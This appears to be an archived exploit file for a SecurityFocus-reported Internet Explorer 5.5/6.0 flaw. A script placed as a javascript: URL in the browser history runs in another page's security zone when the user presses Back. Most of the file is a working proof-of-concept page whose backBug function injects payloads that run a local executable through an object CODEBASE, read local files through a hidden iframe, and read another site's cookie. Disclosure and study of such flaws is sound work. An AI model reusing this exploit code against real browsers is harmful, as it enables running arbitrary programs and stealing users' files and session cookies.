@@ -1,0 +1,47 @@
+source: http://www.securityfocus.com/bid/4505/info
+
+A vulnerability has been reported in some versions of Internet Explorer. It is possible to inject JavaScript code into the browser history list, and execute it within any page context given appropriate user interaction.
+
+Internet Explorer stores javascript: URLs in the browser history list. Script executed within the javascript: URL will inherit the security zone of the last viewed page. This provides protection against javascript: URLs included within a maliciously constructed web page. However, a user may navigate to a javascript: URL using the 'Back' button in their browser. This may result in the injected script code executing within the context of another page.
+
+This behavior has been reported in versions 6.0 and 5.5 of IE. Other versions of Internet Explorer may share this vulnerability. This has not, however, been confirmed. 
+
+<html>
+<h1>Press link and then the backbutton to trigger script.</h1>
+<a href="javascript:execFile('file:///c:/winnt/system32/winmine.exe')">
+Run Minesweeper (c:/winnt/system32/winmine.exe Win2000 pro)</a><br>
+<a href="javascript:execFile('file:///c:/windows/system32/winmine.exe')">
+Run Minesweeper (c:/windows/system32/winmine.exe XP, ME etc...)</a><br>
+<a href="javascript:readFile('file:///c:/test.txt')">
+Read c:\test.txt (needs to be created)</a><br>
+<a href="javascript:readCookie('http://www.google.com/')">
+Read Google cookie</a>
+
+<script>
+// badUrl = "http://www.nonexistingdomain.se"; // Use if not XP
+badUrl = "res:";
+function execFile(file){
+  s = '<object classid=CLSID:11111111-1111-1111-1111-111111111111 ';
+  s+= 'CODEBASE='+file+'></OBJECT>';
+  backBug(badUrl,s);
+}
+function readFile(file){
+  s = '<iframe name=i src='+file+' style=display:none onload=';
+  s+= 'alert(i.document.body.innerText)></iframe>';
+  backBug(badUrl,s);
+}
+function readCookie(url){
+  s = '<script>alert(document.cookie);close();<"+"/script>';
+  backBug(url,s);
+}
+function backBug(url,payload){
+  len = history.length;
+  page = document.location;
+  s = "javascript:if (history.length!="+len+") {";
+  s+= "open('javascript:document.write(\""+payload+"\")')";
+  s+= ";history.back();} else '<script>location=\""+url
+  s+= "\";document.title=\""+page+"\";<"+"/script>';";
+  location = s;
+}
+</script>
+</html>
